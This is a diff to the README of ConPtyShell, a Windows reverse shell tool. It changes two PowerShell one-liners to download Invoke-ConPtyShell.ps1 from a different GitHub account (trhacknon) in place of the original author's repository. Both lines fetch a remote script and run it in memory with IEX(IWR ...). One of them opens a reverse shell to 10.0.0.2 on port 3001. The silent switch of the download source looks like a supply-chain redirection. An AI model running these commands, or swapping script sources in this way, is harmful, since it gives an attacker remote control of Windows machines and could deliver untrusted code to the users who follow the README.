@@ -54,7 +54,7 @@ stty raw -echo; fg[ENTER]
 ##### Client Side:
 Here you should use the values read from ```stty size``` command in the Parameters -Rows and -Cols
 ```
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
+IEX(IWR https://raw.githubusercontent.com/trhacknon/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
 ```
 
 #### Method 3 - Upgrade
@@ -72,7 +72,7 @@ stty raw -echo; fg[ENTER]
 Here you should use the values read from ```stty size``` command in the Parameters -Rows and -Cols
 
 ```
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 24 -Cols 80
+IEX(IWR https://raw.githubusercontent.com/trhacknon/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 24 -Cols 80
 ```
 
 ## Change Console Size
